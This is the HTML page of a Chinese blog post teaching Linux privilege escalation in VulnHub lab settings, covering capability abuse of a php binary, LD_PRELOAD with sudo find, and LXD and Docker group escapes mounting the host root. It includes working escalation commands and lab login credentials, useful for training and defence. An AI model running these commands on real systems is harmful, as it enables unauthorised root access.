@@ -1,0 +1,878 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/%E6%A5%BD.png">
+  <link rel="icon" href="/img/%E6%A5%BD.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="神楽">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Web&amp;用户-Capability能力前言Capability能力其实是属于suid提权，这是Linux特有的，他对文件进行细分，赋予文件不同的能力，文件就可以有不同的权限 简单说一下几个命令   设置能力：setcap cap\_setuid+ep &#x2F;tmp&#x2F;php    删除能力：setcap -r &#x2F;tmp&#x2F;php    查看单个能力：getcap &#x2F;usr&#x2F;bin&#x2F;php    查">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux提权（二）">
+<meta property="og:url" content="https://helloworldbugs.gitlab.io/2024/11/14/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/Linux%E6%8F%90%E6%9D%83%EF%BC%88%E4%BA%8C%EF%BC%89/index.html">
+<meta property="og:site_name" content="神楽的博客">
+<meta property="og:description" content="Web&amp;用户-Capability能力前言Capability能力其实是属于suid提权，这是Linux特有的，他对文件进行细分，赋予文件不同的能力，文件就可以有不同的权限 简单说一下几个命令   设置能力：setcap cap\_setuid+ep &#x2F;tmp&#x2F;php    删除能力：setcap -r &#x2F;tmp&#x2F;php    查看单个能力：getcap &#x2F;usr&#x2F;bin&#x2F;php    查">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-11-14T09:01:02.000Z">
+<meta property="article:modified_time" content="2024-11-19T16:55:12.584Z">
+<meta property="article:author" content="神楽">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>Linux提权（二） - 神楽的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"helloworldbugs.gitlab.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":50,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>神楽的博客</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/guidao.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Linux提权（二）"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-14 17:01" pubdate>
+          2024年11月14日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Linux提权（二）</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2024年11月20日 凌晨
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="Web-用户-Capability能力"><a href="#Web-用户-Capability能力" class="headerlink" title="Web&amp;用户-Capability能力"></a><strong>Web&amp;用户-Capability能力</strong></h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>Capability能力其实是属于suid提权，这是Linux特有的，他对文件进行细分，赋予文件不同的能力，文件就可以有不同的权限</p>
+<p>简单说一下几个命令  </p>
+<pre><code class="hljs">设置能力：setcap cap\_setuid+ep /tmp/php  
+
+删除能力：setcap -r /tmp/php  
+
+查看单个能力：getcap /usr/bin/php  
+
+查看所有能力：getcap -r / 2&gt;/dev/null  
+</code></pre>
+<p> </p>
+<p>Capabilities机制是在Linux内核2.2之后引入的，原理很简单，就是将之前与超级用户root（UID&#x3D;0）关联的特权细分为不同的功能组，Capabilites作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。</p>
+<p>这样一来，权限检查的过程就变成了：在执行特权操作时，如果线程的有效身份不是root，就去检查其是否具有该特权操作所对应的capabilities，并以此为依据，决定是否可以执行特权操作。</p>
+<p>如果Capabilities设置不正确，就会让攻击者有机可乘，实现权限提升。</p>
+<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a><strong>过程</strong></h3><p>前言提到命令<br>#查看一下所有能力  </p>
+<pre><code class="hljs">getcap -r / 2&gt;/dev/null  
+/usr/bin/fping cap\_net\_raw=ep  
+/usr/bin/ping cap\_net\_raw=ep  
+/usr/bin/dumpcap cap\_net\_admin,cap\_net\_raw=eip  
+/usr/lib/x86\_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap\_net\_bind\_service,cap\_net\_admin=ep  
+/tmp/php cap\_setuid=ep  
+</code></pre>
+<p>###我们注意到cap后面跟了不一样的东西，这个就是细分权限具体参考下表  </p>
+<pre><code class="hljs">CAP\_CHOWN 0 允许改变文件的所有权  
+
+CAP\_DAC\_OVERRIDE 1 忽略对文件的所有DAC访问限制  
+
+CAP\_DAC\_READ\_SEARCH 2 忽略所有对读、搜索操作的限制  
+
+CAP\_FOWNER 3 以最后操作的UID,覆盖文件的先前的UID  
+
+CAP\_FSETID 4 确保在文件被修改后不修改setuid/setgid位  
+
+CAP\_KILL 5 允许对不属于自己的进程发送信号  
+
+CAP\_SETGID 6 允许改变组ID  
+
+CAP\_SETUID 7 允许改变用户ID  
+
+CAP\_SETPCAP 8 允许向其它进程转移能力以及删除其它进程的任意能力(只限init进程)  
+
+CAP\_LINUX\_IMMUTABLE 9 允许修改文件的不可修改(IMMUTABLE)和只添加(APPEND-ONLY)属性  
+
+CAP\_NET\_BIND\_SERVICE 10 允许绑定到小于1024的端口  
+
+CAP\_NET\_BROADCAST 11 允许网络广播和多播访问(未使用)  
+
+CAP\_NET\_ADMIN 12 允许执行网络管理任务：接口、防火墙和路由等.  
+
+CAP\_NET\_RAW 13 允许使用原始(raw)套接字  
+
+CAP\_IPC\_LOCK 14 允许锁定共享内存片段  
+
+CAP\_IPC\_OWNER 15 忽略IPC所有权检查  
+
+CAP\_SYS\_MODULE 16 插入和删除内核模块  
+
+CAP\_SYS\_RAWIO 17 允许对ioperm/iopl的访问  
+
+CAP\_SYS\_CHROOT 18 允许使用chroot()系统调用  
+
+CAP\_SYS\_PTRACE 19 允许跟踪任何进程  
+
+CAP\_SYS\_PACCT 20 允许配置进程记帐(process accounting)  
+
+CAP\_SYS\_ADMIN 21 允许执行系统管理任务：加载/卸载文件系统、设置磁盘配额、开/关交换设备和文件等.  
+
+CAP\_SYS\_BOOT 22 允许重新启动系统  
+
+CAP\_SYS\_NICE 23 允许提升优先级，设置其它进程的优先级  
+
+CAP\_SYS\_RESOURCE 24 忽略资源限制  
+
+CAP\_SYS\_TIME 25 允许改变系统时钟  
+
+CAP\_SYS\_TTY\_CONFIG 26 允许配置TTY设备  
+
+CAP\_MKNOD 27 允许使用mknod()系统调用  
+
+CAP\_LEASE 28 允许在文件上建立租借锁  
+
+CAP\_SETFCAP 31 允许在指定的程序上授权能力给其它程序  
+</code></pre>
+<p>#我们看到php是有CAP_SETUID 7 允许改变用户ID 的权限的<br>&#x2F;tmp&#x2F;php cap_setuid&#x3D;ep  </p>
+<p>###参考php执行命令<br>#利用参考：<br><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a>  </p>
+<pre><code class="hljs">/tmp/php -r &quot;posix\_setuid(0); system(&#39;/bin/sh&#39;);&quot;  
+</code></pre>
+<p>反弹成功  
+ </p>
+<h3 id="小坑"><a href="#小坑" class="headerlink" title="小坑"></a><strong>小坑</strong></h3><p>getcap -r &#x2F; 2&gt;&#x2F;dev&#x2F;null有时候不回显，是因为终端不显示，我们需要弹一个新终端出来，或者使用上面写到的工具来筛选，还可以输入完整的地址来执行</p>
+<p>例如</p>
+<pre><code class="hljs">/sbin/getcap -r / 2&gt;/dev/null
+</code></pre>
+<h2 id="普通用户-LD-Preload加载"><a href="#普通用户-LD-Preload加载" class="headerlink" title="普通用户-LD_Preload加载"></a><strong>普通用户-LD_Preload加载</strong></h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>其实Windows提权写到了dll提权，而在Linux提权里面是so文件，大体原理相同，简单说一下流程，就是有些进程权限很高，你就可以找到这些进程调用的so文件来进行覆盖和劫持</p>
+<p>LD_PRELOAD允许你定义在程序运行前优先加载的动态链接库，那么我们便可以在自己定义的动态链接库中装入恶意函数.假设现在出现了一种这样的情况，一个文件中有一个恶意构造的函数和我们程序指令执行时调用的函数一模一样，而LD_PRELOAD路径指向这个文件后，这个文件的优先级高于原本函数的文件，那么优先调用我们的恶意文件后会覆盖原本的那个函数，最后当我们执行了一个指令后它会自动调用一次恶意的函数，这就会导致一些非预期的漏洞出现</p>
+<p>LD_PRELOAD是linux系统的一个环境变量，它可以影响程序的运行时的链接，它允许你定义在程序运行前优先加载的动态链接库</p>
+<ul>
+<li><p>dll &#x3D; windows 的动态链接库文件 把一些功能函数封装在dll文件中，调用时导入调用即可</p>
+</li>
+<li><p>so &#x3D; linux 动态链接库文件</p>
+</li>
+</ul>
+<p>总的来说就是&#x3D;<code>LD_PRELOAD</code>指定的动态链接库文件，会在其它文件调用之前先被调用，借此可以达到劫持的效果</p>
+<h3 id="过程-1"><a href="#过程-1" class="headerlink" title="过程"></a><strong>过程</strong></h3><p>##看一下权限设置（可以用命令也可以用脚本工具）  </p>
+<pre><code class="hljs">vim /etc/sudoers  
+
+
+This file MUST be edited with the &#39;visudo&#39; command as root.  
+
+Please consider adding local content in /etc/sudoers.d/ instead of  
+directly modifying this file.  
+
+See the man page for details on how to write a sudoers file.  
+
+Defaultsenv\_reset  
+Defaultsmail\_badpass  
+Defaultssecure\_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;  
+Defaultsuse\_pty  
+
+This preserves proxy settings from user environments of root  
+equivalent users (group sudo)  
+#Defaults:%sudo env\_keep += &quot;http\_proxy https\_proxy ftp\_proxy all\_proxy no\_proxy&quot;  
+
+This allows running arbitrary commands, but so does ALL, and it means  
+different sudoers have their choice of editor respected.  
+#Defaults:%sudo env\_keep += &quot;EDITOR&quot;  
+
+Completely harmless preservation of a user preference.  
+#Defaults:%sudo env\_keep += &quot;GREP\_COLOR&quot;  
+
+While you shouldn&#39;t normally run git as root, you need to with etckeeper  
+#Defaults:%sudo env\_keep += &quot;GIT\_AUTHOR\_\* GIT\_COMMITTER\_\*&quot;  
+
+Per-user preferences; root won&#39;t have sensible values for them.  
+#Defaults:%sudo env\_keep += &quot;EMAIL DEBEMAIL DEBFULLNAME&quot;  
+
+&quot;sudo scp&quot; or &quot;sudo rsync&quot; should be able to use your SSH agent.  
+#Defaults:%sudo env\_keep += &quot;SSH\_AGENT\_PID SSH\_AUTH\_SOCK&quot;  
+
+Ditto for GPG agent  
+#Defaults:%sudo env\_keep += &quot;GPG\_AGENT\_INFO&quot;  
+
+Host alias specification  
+
+User alias specification  
+
+Cmnd alias specification  
+
+User privilege specification  
+rootALL=(ALL:ALL) ALL  
+
+Allow members of group sudo to execute any command  
+%sudoALL=(ALL:ALL) ALL  
+
+See sudoers(5) for more information on &quot;@include&quot; directives:  
+
+@includedir /etc/sudoers.d  
+</code></pre>
+<p> </p>
+<p>然后把命令加进去(这个命令的意思)</p>
+<pre><code class="hljs">Defaults env\_keep += LD\_PRELOAD
+</code></pre>
+<p>加到下面这一块</p>
+<pre><code class="hljs">This file MUST be edited with the &#39;visudo&#39; command as root.  
+
+Please consider adding local content in /etc/sudoers.d/ instead of  
+directly modifying this file.  
+
+See the man page for details on how to write a sudoers file.  
+
+Defaultsenv\_reset  
+Defaultsmail\_badpass  
+Defaultssecure\_path=&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;  
+Defaultsuse\_pty  
+Defaults env\_keep += LD\_PRELOAD
+</code></pre>
+<p>加入用户权限</p>
+<pre><code class="hljs">mkbk ALL=(ALL:ALL) NOPASSWD: /usr/bin/find
+</code></pre>
+<p>前面提过sudo的find提权就不细说了</p>
+<pre><code class="hljs">$ sudo find . -exec /bin/sh \\; -quit
+
+id
+
+用户id=0(root) 组id=0(root) 组=0(root)  
+</code></pre>
+<p> </p>
+<h2 id="Linux系统提权-普通用户-LXD容器"><a href="#Linux系统提权-普通用户-LXD容器" class="headerlink" title="Linux系统提权-普通用户-LXD容器"></a><strong>Linux系统提权-普通用户-LXD容器</strong></h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>在讲述以下三种提权之前，我们先搞清楚LXD、LXC和docker三种容器的区别。</p>
+<h3 id="LXD和LXC"><a href="#LXD和LXC" class="headerlink" title="LXD和LXC"></a><strong>LXD和LXC</strong></h3><p>Linux Container（LXC）通常被认为是一种轻量级虚拟化技术，它介于Chroot和完整开发的虚拟机之间，LXC可以创建一个跟正常Linux操作系统十分接近的环境，但是不需要使用到单独的内核资源。</p>
+<p>Linux Daemon（LXD）是一个轻量级容器管理程序，而LXD是基于LXC容器技术实现的，而这种技术之前Docker也使用过。LXD使用了稳定的LXC API来完成所有的后台容器管理工作，并且增加了REST API支持，更进一步地提升了用户体验度。</p>
+<h3 id="容器技术"><a href="#容器技术" class="headerlink" title="容器技术"></a><strong>容器技术</strong></h3><p>所谓的容器技术，也就是在主机操作系统中创建一个隔离的环境，以允许某个进程或应用程序在一个不影响主操作系统以及其他进程的环境下运行。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><p>LXD是拉应用的容器，LXC是拉系统的容器</p>
+<p>LXD和LXC是Linux自带的容器，而docke容器是第三方容器，LXD是一个root进程，它可以负责执行任意用户的LXD UNIX套接字写入访问操作。而且在某些情况下，LXD甚至都不会对调用它的用户权限进行检查和匹配，现在社区也有很多种方法可以利用LXD的这种特性来实施攻击。</p>
+<p>其中的一项技术就是使用LXD API来将目标主机的根文件系统加载进一个容器中，而本文讨论的也是这项技术。一旦成功，攻击者就可以将低权限的用户提升为root权限，并且能够在不受任何限制的情况下访问目标系统的各种数据资源。</p>
+<p>当然大部分情况不会出现该种提权，但是在面试和ctf、内网攻防比赛可能会出现该种提权</p>
+<h3 id="过程-2"><a href="#过程-2" class="headerlink" title="过程"></a><strong>过程</strong></h3><p>废话不多说直接开干</p>
+<p>复现靶场</p>
+<p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/ai-web-2,357/">https://www.vulnhub.com/entry/ai-web-2,357/</a></p>
+<p>通过ssh连接<br>账号：n0nr00tuser<br>Pass:zxowieoi4sdsadpEClDws1sf  </p>
+<p>入口打点我就不讲了有wp  </p>
+<p>进去看见权限后面跟了一个lxd，如果是docker就会跟一个docker  </p>
+<pre><code class="hljs">n0nr00tuser@aiweb2host:/var/www/html$ id  
+uid=1001(n0nr00tuser) gid=1001(n0nr00tuser) groups=1001(n0nr00tuser),108(lxd)  
+</code></pre>
+<p>不能通过命令写入一句话木马到网站目录因为没有权限<br>经过测试&#x2F;tmp路径有权限写入我们可以上传提权检测脚本  </p>
+<p>我用的是LinEnum项目  </p>
+<p>检测出来 </p>
+<pre><code class="hljs">[+] We&#39;re a member of the (lxd) group - could possibly misuse these rights!  
+uid=1001(n0nr00tuser) gid=1001(n0nr00tuser) groups=1001(n0nr00tuser),108(lxd)  
+</code></pre>
+<p> </p>
+<p>简单说一下流程</p>
+<p>我们先传一个镜像过去，很小只有3mb，如果可以访问外网我们也可以下载一个镜像</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p>
+<p>然后创建容器，挂载磁盘，进入容器，进入目录提权</p>
+<p>先用lxc命令创建一个镜像，并且创建一个test用户 </p>
+<pre><code class="hljs">n0nr00tuser@aiweb2host:/tmp$ lxc image import ./alpine-v3.13-x86\_64-20210218\_0139.tar.gz --alias test  
+
+Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b  
+</code></pre>
+<p>再对这个镜像进行初始化  </p>
+<pre><code class="hljs">n0nr00tuser@aiweb2host:/tmp$ lxc init test test -c security.privileged=true  
+
+reating test  
+</code></pre>
+<p>设置一下镜像的路径  </p>
+<pre><code class="hljs">lxc config device add test test disk source=/ path=/mnt/root recursive=true  
+</code></pre>
+<p>解释一下这条命令 </p>
+<pre><code class="hljs">source=/ path=/mnt/root   这个的意思是把镜像的/mnt/root   代表根目录  
+/mnt/root/   而进入镜像以后根目录就是这个  
+</code></pre>
+<p>启动镜像  </p>
+<pre><code class="hljs">lxc start test  
+</code></pre>
+<p>然后进入镜像弹回一个终端  </p>
+<pre><code class="hljs">xc exec test /bin/sh  
+</code></pre>
+<p>提权成功  </p>
+<pre><code class="hljs">n0nr00tuser@aiweb2host:/tmp$ lxc exec test /bin/sh  
+~ # id  
+uid=0(root) gid=0(root)  
+</code></pre>
+<p> </p>
+<h2 id="Linux系统提权-普通用户-Docker容器"><a href="#Linux系统提权-普通用户-Docker容器" class="headerlink" title="Linux系统提权-普通用户-Docker容器"></a><strong>Linux系统提权-普通用户-Docker容器</strong></h2><h3 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a><strong>前言</strong></h3><p>docker和lxd提权原理过程差不多，所以就不细说了，就是一些命令的不同</p>
+<h2 id="docker容器内用户权限不受限"><a href="#docker容器内用户权限不受限" class="headerlink" title="docker容器内用户权限不受限"></a><strong>docker容器内用户权限不受限</strong></h2><p>我们知道，用户创建一个docker容器后，容器内默认是root账户，在不需要加sudo的情况下可以任意更改容器内的配置。</p>
+<p>正常情况下，这种模式既可以保证一台机器被很多普通用户使用，通过docker容器的隔离，相互之前互不影响；也给用户在容器内开放了充足的权限保证用户可以正常安装软件，修改容器配置等操作。</p>
+<h2 id="docker文件映射方便容器内外文件共享"><a href="#docker文件映射方便容器内外文件共享" class="headerlink" title="docker文件映射方便容器内外文件共享"></a><strong>docker文件映射方便容器内外文件共享</strong></h2><p>在我们创建容器的时候，docker提供了一个<code>-v</code>选项，提供用户将容器外的host目录映射进容器内，方便的进行容器内外的文件共享。</p>
+<p>然而便利倒是有了，但潜在了风险也是可想而知。</p>
+<p>结合上面的两点便利，笔者想到一种普通用户借助docker突破权限的限制，达到本地提权的目的。</p>
+<h3 id="Docker本地提权条件"><a href="#Docker本地提权条件" class="headerlink" title="Docker本地提权条件:"></a><strong>Docker本地提权条件:</strong></h3><p>1、已经获得Shell</p>
+<p>2、用户属于docker组</p>
+<h3 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a><strong>靶场</strong></h3><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/chill-hack-1,622/">https://www.vulnhub.com/entry/chill-hack-1,622/</a></p>
+<p>1、入口点：</p>
+<p>User: anurodh</p>
+<p>Pass: !d0ntKn0wmYp@ssw0rd</p>
+<h3 id="过程-3"><a href="#过程-3" class="headerlink" title="过程"></a><strong>过程</strong></h3><p>检测及利用：  </p>
+<pre><code class="hljs">./LinEnum.sh  
+</code></pre>
+<p>创建容器，挂载磁盘，进入容器，进入目录提权  </p>
+<pre><code class="hljs">docker run -v /:/mnt -it alpine  
+
+cd /mnt/root
+</code></pre>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a><strong>总结</strong></h2><p>Linux提权总的来说分为三块：内核溢出提权，SUID&amp;SUDO提权，虚拟镜像提权。本章节讲了这么多方法，万变不离其宗的就是权限分配不当，有许多方法是联动SUID&amp;SUDO提权，只是中间过程绕了一下，讲这么多提权方法是为了应对面试和内网比赛，在实战中更可能遇到的是SUID&amp;SUDO提权和内核提权，应该着重关注学习</p>
+<p>完结！！！！</p>
+<p>原文：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/xmCt7qGD78ROTdfs_LTD1g">Linux提权（二）</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BD%91%E5%AE%89/" class="category-chain-item">网安</a>
+  
+  
+    <span>></span>
+    
+  <a href="/categories/%E7%BD%91%E5%AE%89/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91/" class="category-chain-item">内网横向</a>
+  
+  
+
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+</div>
+
+
+              
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/11/20/%E7%BD%91%E5%AE%89/%E6%BC%8F%E6%B4%9E%E4%B8%93%E9%A2%98/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%80%BB%E7%BB%93/" title="PHP伪协议总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">PHP伪协议总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/10/31/%E7%BD%91%E5%AE%89/%E5%A5%87%E6%B7%AB%E5%B7%A7%E8%AE%A1/%E5%B8%A6%E5%A4%96%E6%94%BB%E5%87%BBOOB%EF%BC%88RCE%E6%97%A0%E5%9B%9E%E6%98%BE%E9%AA%9A%E6%80%9D%E8%B7%AF%E6%80%BB%E7%BB%93%EF%BC%89/" title="带外攻击OOB（RCE无回显骚思路总结）">
+                        <span class="hidden-mobile">带外攻击OOB（RCE无回显骚思路总结）</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
